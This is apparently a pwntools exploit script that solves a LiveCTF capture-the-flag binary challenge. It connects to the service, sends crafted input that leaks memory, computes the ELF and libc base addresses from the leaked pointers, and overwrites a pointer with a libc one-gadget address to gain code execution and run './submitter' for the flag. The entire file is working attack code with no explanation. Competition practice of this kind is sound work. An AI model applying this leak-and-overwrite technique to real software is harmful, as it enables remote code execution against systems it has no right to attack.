#!/usr/bin/env python3

from pwn import *

elf = ELF("./challenge", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = elf
# context.log_level = "DEBUG"
# context.terminal = "cmd.exe /c start wsl.exe".split(' ')


HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
# p = process("./challenge")

p.sendlineafter(b"be?\n", b"10")
p.sendlineafter(b"get?\n", b"3")

p.sendlineafter(b"?\n", b"anything-\xff")

payload = flat({
    0x0: b"\x90"*10,
    0x83: b"\x0f\xff"
})

# gdb.attach(p)
p.sendlineafter(b"?\n", payload)

info_leak = b"".join([x for x in p.recvuntil(b"?\n").split(b" ") if len(x) == 1])[6:]
elf_leak = u64(info_leak[160:160+8])
elf.address = elf_leak - 0x13c7

libc_leak = u64(info_leak[144:144+8])
libc.address = libc_leak - 0x29D90

log.info(f"{hex(elf.address)=} {hex(libc.address)=}")
# gdb.attach(p, f"b*0x1799+{hex(elf.address)}") # 0x1799

gadgets = [0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebda8, 0xebdaf, 0xebdb3]
payload = b"\x70"*0x6c+p64(elf.address + 0x4898)+p64(libc.address + gadgets[5]) + b"?"*6

skipped = [9, 10, 11, 12, 13, 32]
if any(x in skipped for x in payload):
    print("skippable character found!")
    exit()

p.sendline(payload)
p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# p.interactive()
p.close()
